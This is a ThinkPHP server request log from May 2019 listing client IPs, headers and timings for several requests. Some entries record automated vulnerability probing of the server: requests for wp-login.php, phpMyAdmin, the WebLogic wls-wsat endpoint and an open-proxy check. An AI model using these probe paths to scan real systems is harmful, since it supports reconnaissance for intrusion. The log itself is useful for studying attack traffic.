[2019-05-11T19:47:35+08:00] 106.15.201.111 GET www.csgxjk.com/
[运行时间：0.016604s] [吞吐率：60.23req/s] [内存消耗：1,982.05kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'www.csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T20:31:00+08:00] 36.84.63.173 GET 39.96.87.22:80/
[运行时间：0.016870s] [吞吐率：59.28req/s] [内存消耗：1,982.07kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T21:40:46+08:00] 112.140.160.254 GET csgxjk.com/cms/wp-login.php
[运行时间：0.015435s] [吞吐率：64.79req/s] [内存消耗：1,707.48kb] [文件加载：66]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T21:46:19+08:00] 186.211.3.37 GET 39.96.87.22:80/
[运行时间：0.015905s] [吞吐率：62.87req/s] [内存消耗：1,982.07kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T22:39:12+08:00] 23.115.67.42 GET 39.96.87.22//index.php
[运行时间：0.016034s] [吞吐率：62.37req/s] [内存消耗：1,982.55kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'host' => '39.96.87.22',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0',
  'content-type' => 'text/html',
  'accept' => 'text/html, application/xhtml+xml, */*',
  'x-forwarded-for' => '23.115.67.42',
  'client-ip' => '23.115.67.42',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T22:39:12+08:00] 23.115.67.42 GET 39.96.87.22//phpmyadmin/index.php
[运行时间：0.013878s] [吞吐率：72.06req/s] [内存消耗：1,729.66kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T23:00:52+08:00] 80.82.70.187 GET www.baidu.com/cache/global/img/gs.gif
[运行时间：0.015374s] [吞吐率：65.05req/s] [内存消耗：1,729.55kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T23:03:08+08:00] 95.213.177.125 POST check.proxyradar.com/azenv.php?auth=155758698765&a=PSCN&i=660625174&p=80
[运行时间：0.015432s] [吞吐率：64.80req/s] [内存消耗：1,729.46kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T23:07:37+08:00] 222.209.233.176 GET 39.96.87.22/wls-wsat/CoordinatorPortType
[运行时间：0.015498s] [吞吐率：64.52req/s] [内存消耗：1,729.63kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T23:10:24+08:00] 5.233.150.194 GET 39.96.87.22:80/
[运行时间：0.016356s] [吞吐率：61.14req/s] [内存消耗：1,982.07kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
